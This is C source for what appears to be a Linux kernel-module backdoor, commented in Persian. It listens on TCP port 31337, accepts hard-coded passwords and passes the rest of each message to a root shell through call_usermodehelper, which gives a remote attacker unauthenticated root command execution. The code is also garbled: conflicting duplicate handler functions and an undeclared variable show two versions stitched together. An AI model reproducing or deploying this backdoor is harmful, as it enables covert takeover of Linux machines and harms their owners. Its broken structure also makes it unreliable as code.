#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include "common.h"
#include "phantom_defs.h"

#define MAGIC_PORT 31337
#define BACKDOOR_PASSWORD "DSK_SECRET_2025"
#define BACKDOOR_PORT 31337
#define MAGIC_PASSWORD "Ph@nt0mK3y"

// اجرای دستورات سیستمی
static int exec_command(char *cmd) {
    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/bin", NULL };
    
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

// هندلر بک‌دور
static void backdoor_handler(struct socket *sock) {
    struct kvec vec;
    char buffer[1024];
    int len;

    vec.iov_base = buffer;
    vec.iov_len = sizeof(buffer);

    kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);

    if (strncmp(buffer, BACKDOOR_PASSWORD, strlen(BACKDOOR_PASSWORD)) == 0) {
        char *cmd = buffer + strlen(BACKDOOR_PASSWORD) + 1;
        exec_command(cmd);
    }
}

// ایجاد سرویس بک‌دور
static int create_backdoor(void) {
    struct socket *sock;
    int ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    
    if (ret < 0) return ret;

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(MAGIC_PORT),
        .sin_addr.s_addr = INADDR_ANY,
    };

    sock->ops->bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    sock->ops->listen(sock, 5);

    while (!kthread_should_stop()) {
        struct socket *client;
        kernel_accept(sock, &client, 0);
        backdoor_handler(client);
        sock_release(client);
    }
    return 0;
}

// اجرای دستورات با دسترسی root
static void execute_root_command(char *cmd) {
    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

// هندلر بک‌دور
static void backdoor_handler(struct socket *sock) {
    struct kvec vec;
    char buffer[1024];
    int len;

    vec.iov_base = buffer;
    vec.iov_len = sizeof(buffer);

    len = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
    
    if (len > strlen(MAGIC_PASSWORD) && 
        !memcmp(buffer, MAGIC_PASSWORD, strlen(MAGIC_PASSWORD))) {
        char *cmd = buffer + strlen(MAGIC_PASSWORD);
        execute_root_command(cmd);
    }
}

// ایجاد سرویس بک‌دور
static int phantom_backdoor(void *arg) {
    struct socket *sock;
    int ret = sock_create_kern(&init_net, AF_INET6, SOCK_STREAM, IPPROTO_TCP, &sock);
    
    if (ret < 0) return ret;

    struct sockaddr_in6 addr = {
        .sin6_family = AF_INET6,
        .sin6_port = htons(BACKDOOR_PORT),
        .sin6_addr = in6addr_any,
    };

    kernel_bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    kernel_listen(sock, 5);

    while (!kthread_should_stop()) {
        struct socket *client;
        kernel_accept(sock, &client, 0);
        backdoor_handler(client);
        sock_release(client);
    }
    return 0;
}

